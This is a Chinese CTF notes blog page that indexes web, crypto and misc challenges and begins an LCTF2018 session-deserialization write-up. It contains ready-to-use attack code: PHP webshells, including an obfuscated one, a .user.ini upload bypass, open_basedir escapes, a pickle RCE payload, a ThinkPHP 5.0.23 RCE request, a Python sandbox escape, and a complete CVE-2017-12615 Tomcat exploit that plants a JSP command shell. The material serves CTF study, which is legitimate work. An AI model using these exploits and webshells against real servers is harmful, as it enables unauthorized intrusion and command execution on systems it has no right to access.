<h4 id="SUCTF-2019：Pythonginx"><a href="#SUCTF-2019：Pythonginx" class="headerlink" title="SUCTF 2019：Pythonginx"></a>SUCTF 2019：Pythonginx</h4><p>链接：<a href="https://xz.aliyun.com/t/6042#toc-28" target="_blank" rel="noopener">https://xz.aliyun.com/t/6042#toc-28</a></p>
<p><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a></p>
<h4 id="ASIS-2019：Unicorn-shop"><a href="#ASIS-2019：Unicorn-shop" class="headerlink" title="ASIS 2019：Unicorn shop"></a>ASIS 2019：Unicorn shop</h4><p>单个字符表示大数</p>
<p>链接：<a href="https://www.compart.com/en/unicode/charsets" target="_blank" rel="noopener">https://www.compart.com/en/unicode/charsets</a></p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><h4 id="dropbox"><a href="#dropbox" class="headerlink" title="dropbox"></a>dropbox</h4><p>phar反序列化+任意文件包含</p>
<h4 id="SUCTF-2019：CheckIn"><a href="#SUCTF-2019：CheckIn" class="headerlink" title="SUCTF 2019：CheckIn"></a>SUCTF 2019：CheckIn</h4><p>.user.ini配置文件</p>
<p>图片头过waf</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=a.jpg</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">'php'</span>&gt;</span><span class="actionscript">system(<span class="string">'cat /flag'</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="ByteCTF-2019：EZCMS"><a href="#ByteCTF-2019：EZCMS" class="headerlink" title="ByteCTF 2019：EZCMS"></a>ByteCTF 2019：EZCMS</h4><p>哈希长度拓展攻击；phar反序列；字符串拼接过waf</p>
<p>拼接一句话木马：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$a=<span class="string">"syste"</span>;</span></span><br><span class="line"><span class="php">$b=<span class="string">"m"</span>;</span></span><br><span class="line"><span class="php">$c=$a.$b;</span></span><br><span class="line"><span class="php">$d=$c($_REQUEST[<span class="string">'a'</span>]);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>生成phar模板</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> File();</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$phar = <span class="keyword">new</span> Phar(<span class="string">"1.phar"</span>);</span></span><br><span class="line"><span class="php">$phar-&gt;startBuffering();</span></span><br><span class="line"><span class="php">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span></span><br><span class="line"><span class="php">$phar-&gt;setMetadata($a); </span></span><br><span class="line"><span class="php">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span></span><br><span class="line"><span class="php">$phar-&gt;stopBuffering();</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>哈希长度拓展攻击</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">hash_sign</span> = hashpumpy.hashpump(sign, str1, str2, key_lenth)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sign为 md5(key+str1)</span></span><br><span class="line"><span class="comment">#str2为要拼接的字符串</span></span><br></pre></td></tr></table></figure>

<p>php://filter/resource=phar://    &lt;==&gt;    phar://</p>
<p>找自带某种方法的类</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$classes = get_declared_classes();</span></span><br><span class="line"><span class="php"><span class="keyword">foreach</span> ($classes <span class="keyword">as</span> $class) &#123;</span></span><br><span class="line"><span class="php">    $methods = get_class_methods($class);</span></span><br><span class="line"><span class="php">    <span class="keyword">foreach</span> ($methods <span class="keyword">as</span> $method) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> ($method === <span class="string">'open'</span>) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">print</span> $class . <span class="string">'::'</span> . $method . <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>

<p>ZipArchive类的利用来覆盖文件</p>
<h4 id="SUCTF-easy-web"><a href="#SUCTF-easy-web" class="headerlink" title="SUCTF-easy web"></a>SUCTF-easy web</h4><p>利用未过滤字符 异或 出目标字符串，执行命令</p>
<p>脚本构造上传文件</p>
<p>上传.htaccess来解析自己上传的shell</p>
<p>强行目录穿越（八苦提到过）</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'img'</span>);<span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);<span class="selector-tag">print_r</span>(scandir(<span class="string">'/'</span>));</span><br></pre></td></tr></table></figure>

<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'/tmp'</span>);<span class="selector-tag">mkdir</span>(<span class="string">'sky'</span>);<span class="selector-tag">chdir</span>(<span class="string">'sky'</span>);<span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);<span class="selector-tag">print_r</span>(file_get_contents(<span class="string">'/THis_Is_tHe_F14g'</span>));</span><br></pre></td></tr></table></figure>

<p>脚本上传文件</p>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">content = b<span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">data</span> = &#123;<span class="string">"upload"</span>:<span class="string">"Submit"</span>&#125;</span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'file'</span>,(<span class="string">'content.php'</span>,content,<span class="string">'image/jpeg'</span>))]</span><br><span class="line"></span><br><span class="line">r = requests.post(url=url, <span class="keyword">data</span>=<span class="keyword">data</span>, files=files)</span><br><span class="line"></span><br><span class="line">print(r.<span class="keyword">text</span>)</span><br></pre></td></tr></table></figure>

<h3 id="php-math"><a href="#php-math" class="headerlink" title="php-math"></a>php-math</h3><h4 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h4><p>wp:<a href="https://mp.weixin.qq.com/s?__biz=MzkwNzAwMDYyNQ==&amp;mid=2247483858&amp;idx=1&amp;sn=19234bf6611400ae9da5d9a49a233cde&amp;chksm=c0deaf8cf7a9269a32d928617d0c3eb11720914c591e0dc4d017450b9ef3809f2ed6a348a1b8&amp;mpshare=1&amp;scene=23&amp;srcid=1016GXIy2HOar4STCzN93JIO&amp;sharer_sharetime=1571181198903&amp;sharer_shareid=fbbfc02e7625095a3404e2482b0c7a95#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzkwNzAwMDYyNQ==&amp;mid=2247483858&amp;idx=1&amp;sn=19234bf6611400ae9da5d9a49a233cde&amp;chksm=c0deaf8cf7a9269a32d928617d0c3eb11720914c591e0dc4d017450b9ef3809f2ed6a348a1b8&amp;mpshare=1&amp;scene=23&amp;srcid=1016GXIy2HOar4STCzN93JIO&amp;sharer_sharetime=1571181198903&amp;sharer_shareid=fbbfc02e7625095a3404e2482b0c7a95#rd</a></p>
<p>http走私漏洞绕waf:<a href="https://paper.seebug.org/1048/（但在这一题是如何利用的，不是很懂，望大佬指教）" target="_blank" rel="noopener">https://paper.seebug.org/1048/（但在这一题是如何利用的，不是很懂，望大佬指教）</a></p>
<p>base_convert()</p>
<p>hex2bin(dechex($num)）</p>
<h3 id="综合大题"><a href="#综合大题" class="headerlink" title="综合大题"></a>综合大题</h3><h4 id="ikun"><a href="#ikun" class="headerlink" title="ikun"></a>ikun</h4><ol>
<li>目标搜寻：</li>
</ol>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = <span class="string">"http://web44.buuoj.cn/shop?page="</span></span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> range(<span class="number">2000</span>):</span><br><span class="line">    r = requests.get(url+str(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'lv6.png'</span> <span class="keyword">in</span> r<span class="selector-class">.content</span>:</span><br><span class="line">        print i</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>抓包该数据</p>
</li>
<li><p>JSON Web Token</p>
</li>
<li><p>python 反序列化  __reduce__</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">       <span class="keyword">return</span> (eval, (<span class="string">"open('/flag.txt','r').read()"</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="keyword">print</span> a</span><br></pre></td></tr></table></figure>



</li>
</ol>
<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><h4 id="thinkphp5-0-23"><a href="#thinkphp5-0-23" class="headerlink" title="thinkphp5.0.23"></a>thinkphp5.0.23</h4><p>rce：<a href="https://www.jianshu.com/p/ae48507135f3?tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">https://www.jianshu.com/p/ae48507135f3?tdsourcetag=s_pcqq_aiomsg</a><br>payload :  index.php?s=captcha<br>POST:_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls -al<br>补丁：<a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003</a></p>
<h3 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h3><h4 id="CVE-2017-12615"><a href="#CVE-2017-12615" class="headerlink" title="CVE-2017-12615"></a>CVE-2017-12615</h4><p>一.影响版本</p>
<p>Apache Tomcat 7.0.0 - 7.0.81</p>
<p>二.实验环境</p>
<p>下载链接:<a href="http://www.oracle.com/technetwork/java/javase/downloads/index.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/java/javase/downloads/index.html</a></p>
<p>3.Apache Tomcat 7.0.75</p>
<p>4.poc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! -*- coding:utf-8 -*-</span></span><br><span class="line">__author__=<span class="string">"浮萍"</span></span><br><span class="line">__Date__=<span class="string">"20170920"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Usage:</span></span><br><span class="line"><span class="string">    python CVE-2017-12615.py www.example.com:8080</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    python CVE-2017-12615.py 192.168.135.132</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    shell：http://192.168.135.132/1505876909.jsp?cmd=cat /flag&amp;pwd=023</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">Python version: 2.7.13</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">tomcat:apache-tomcat-7.0.70 apache-tomcat-7.0.81</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">在apache-tomcat-7.0.70 apache-tomcat-7.0.81测试成功。</span></span><br><span class="line"><span class="string">apache-tomcat-7.0.70文件名可为 put  test.jsp/ 和 put  test.jsp::$DATA</span></span><br><span class="line"><span class="string">apache-tomcat-7.0.81文件名可为put test.jsp/</span></span><br><span class="line"><span class="string">文件名也可以试试 test.jsp/. 来绕过</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> httplib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">body = <span class="string">'''&lt;%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%&gt;&lt;%!public static String excuteCmd(String c) &#123;StringBuilder line = new StringBuilder();try &#123;Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) &#123;line.append(temp</span></span><br><span class="line"><span class="string">+"\\n");&#125;buf.close();&#125; catch (Exception e) &#123;line.append(e.getMessage());&#125;return line.toString();&#125;%&gt;&lt;%if("023".equals(request.getParameter("pwd"))&amp;&amp;!"".equals(request.getParameter("cmd")))&#123;out.println("&lt;pre&gt;"+excuteCmd(request.getParameter("cmd"))+"&lt;/pre&gt;");&#125;else&#123;out.println(":-)");&#125;%&gt;'''</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    conn = httplib.HTTPConnection(sys.argv[<span class="number">1</span>])</span><br><span class="line">    conn.request(method=<span class="string">'OPTIONS'</span>, url=<span class="string">'/ffffzz'</span>)</span><br><span class="line">    headers = dict(conn.getresponse().getheaders())</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'allow'</span> <span class="keyword">in</span> headers <span class="keyword">and</span> \</span><br><span class="line">       headers[<span class="string">'allow'</span>].find(<span class="string">'PUT'</span>) &gt; <span class="number">0</span> :</span><br><span class="line">        conn.close()</span><br><span class="line">        conn = httplib.HTTPConnection(sys.argv[<span class="number">1</span>])</span><br><span class="line">        url = <span class="string">"/"</span> + str(int(time.time()))+<span class="string">'.jsp/'</span></span><br><span class="line">        <span class="comment">#url = "/" + str(int(time.time()))+'.jsp::$DATA'</span></span><br><span class="line">        conn.request( method=<span class="string">'PUT'</span>, url= url, body=body)</span><br><span class="line">        res = conn.getresponse()</span><br><span class="line">        <span class="keyword">if</span> res.status  == <span class="number">201</span> :</span><br><span class="line">            <span class="comment">#print 'shell:', 'http://' + sys.argv[1] + url[:-7]</span></span><br><span class="line">            a=<span class="string">'http://'</span> + sys.argv[<span class="number">1</span>] + url[:<span class="number">-1</span>]</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'shell:'</span>, a</span><br><span class="line">            urll= a+<span class="string">"?cmd=cat /flag&amp;pwd=023"</span></span><br><span class="line">            res=requests.post(urll)</span><br><span class="line">            print(res.text)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">elif</span> res.status == <span class="number">204</span> :</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'file exists'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'error'</span></span><br><span class="line">        conn.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Server not vulnerable'</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">except</span> Exception,e:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Error:'</span>, e</span><br></pre></td></tr></table></figure>

<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="xortool"><a href="#xortool" class="headerlink" title="xortool"></a>xortool</h3><h4 id="De1CTF2019：XORZ"><a href="#De1CTF2019：XORZ" class="headerlink" title="De1CTF2019：XORZ"></a>De1CTF2019：XORZ</h4><h3 id="流密码"><a href="#流密码" class="headerlink" title="流密码"></a>流密码</h3><h4 id="赛博杯：川流不息"><a href="#赛博杯：川流不息" class="headerlink" title="赛博杯：川流不息"></a>赛博杯：川流不息</h4><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><h4 id="赛博杯：easy-RSA"><a href="#赛博杯：easy-RSA" class="headerlink" title="赛博杯：easy_RSA"></a>赛博杯：easy_RSA</h4><p>大叔分解，rsatool，openssl</p>
<p>链接：<a href="https://www.cnblogs.com/Byqiyou/p/9410885.html" target="_blank" rel="noopener">https://www.cnblogs.com/Byqiyou/p/9410885.html</a></p>
<h3 id="块加密"><a href="#块加密" class="headerlink" title="块加密"></a>块加密</h3><h4 id="Ogeek：BabyCry"><a href="#Ogeek：BabyCry" class="headerlink" title="Ogeek：BabyCry"></a>Ogeek：BabyCry</h4><p>des，利用padding逐位爆破</p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h3><h4 id="赛博杯：No-Word"><a href="#赛博杯：No-Word" class="headerlink" title="赛博杯：No Word"></a>赛博杯：No Word</h4><p>snow隐写</p>
<h4 id="赛博杯：The-world"><a href="#赛博杯：The-world" class="headerlink" title="赛博杯：The world"></a>赛博杯：The world</h4><p>图片隐写、zip弱密码爆破、outguess隐写、mp3隐写</p>
<h4 id="赛博杯：Different-P"><a href="#赛博杯：Different-P" class="headerlink" title="赛博杯：Different_P"></a>赛博杯：Different_P</h4><p>图片隐写：比较两张图片元素点的灰度</p>
<p>####安恒7月赛： 弱口令</p>
<p>压缩包注释；snow隐写；摩斯密码；lsb隐写</p>
<h3 id="社工："><a href="#社工：" class="headerlink" title="社工："></a>社工：</h3><h4 id="赛博杯：基础社工"><a href="#赛博杯：基础社工" class="headerlink" title="赛博杯：基础社工"></a>赛博杯：基础社工</h4><p>IP反查询工具，Whois查询，IP备案</p>
<h3 id="沙箱逃逸"><a href="#沙箱逃逸" class="headerlink" title="沙箱逃逸"></a>沙箱逃逸</h3><h4 id="Ogeek：Pybox"><a href="#Ogeek：Pybox" class="headerlink" title="Ogeek：Pybox"></a>Ogeek：Pybox</h4><p>链接：<a href="https://bestwing.me/awesome-python-sandbox-in-ciscn.html" target="_blank" rel="noopener">https://bestwing.me/awesome-python-sandbox-in-ciscn.html</a></p>
<p>逐位爆破，</p>
<p>结合时间盲注：</p>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> <span class="built_in">time</span></span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">"47.112.108.17"</span>,<span class="number">12312</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ans = <span class="string">"__import__.__getattribute__('__clo'+'sure__')[0].cell_contents('o'+'s').__getattribute__('sy'+'stem')('a=`cut -c 1 /home/flag`; [ $a = \"</span>f\<span class="string">" ] &amp;&amp; sleep 1'"</span></span><br><span class="line">t = <span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line">sh.sendline(ans)</span><br><span class="line">sh.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">time</span>.<span class="built_in">time</span>()-t &gt; <span class="number">0.5</span> :</span><br><span class="line">	print(<span class="string">"get!"</span>)</span><br><span class="line">	break</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2099/12/31/题目导航(手动置顶)/" data-id="ck2g3l2jk0010lgv3h3mul3ho" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/navigation/">navigation</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-LCTF2018_bestphp&#39;s_revenge" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/10/07/LCTF2018_bestphp's_revenge/" class="article-date">
  <time datetime="2019-10-07T15:01:00.000Z" itemprop="datePublished">2019-10-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/07/LCTF2018_bestphp's_revenge/">LCTF2018-bestphp&#39;s revenge</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="LCTF2018-bestphp’s-revenge"><a href="#LCTF2018-bestphp’s-revenge" class="headerlink" title="LCTF2018-bestphp’s revenge"></a>LCTF2018-bestphp’s revenge</h1><p>源码：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">$b = <span class="string">'implode'</span>;</span></span><br><span class="line"><span class="php">call_user_func($_GET[f],$_POST);</span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[name]))&#123;</span></span><br><span class="line"><span class="php">    $_SESSION[name] = $_GET[name];</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">var_dump($_SESSION);</span></span><br><span class="line"><span class="php">$a = <span class="keyword">array</span>(reset($_SESSION),<span class="string">'welcome_to_the_lctf2018'</span>);</span></span><br><span class="line"><span class="php">call_user_func($b,$a);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>flag.php</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">session_start();</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'only localhost can get flag!'</span>;</span><br><span class="line">$<span class="built_in">flag</span> = <span class="string">'LCTF&#123;*************************&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>($<span class="variable">_SERVER</span>[<span class="string">"REMOTE_ADDR"</span>]===<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">       $<span class="variable">_SESSION</span>[<span class="string">'flag'</span>] = $<span class="built_in">flag</span>;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get <span class="built_in">flag</span>!</span><br></pre></td></tr></table></figure>

<p>参考wp：<a href="https://cloud.tencent.com/developer/article/1376384" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1376384</a></p>
<p>题目给了hint：反序列化。<br>题目中并没有反序列化函数，由于session文件内容的格式不好控制，也无法利用phar://进行反序列化，那么基本就可以确定题目与PHP中SESSION的反序列化机制有关。</p>
<p>利用回调函数调用session_start函数，修改session的位置，再配合LFI进行getshell。</p>
<p>php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。 存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列话之后的内容。 在php.ini中存在三项配置项：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session.save_path=<span class="string">""</span>   --设置session的存储路径</span><br><span class="line">session.save_handler=<span class="string">""</span> --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</span><br><span class="line">session.serialize_handler   string --定义用来序列化/反序列化的处理器名字。默认是php(<span class="number">5.5</span><span class="number">.4</span>后改为php_serialize)</span><br></pre></td></tr></table></figure>

<p>session.serialize_handler存在以下几种</p>
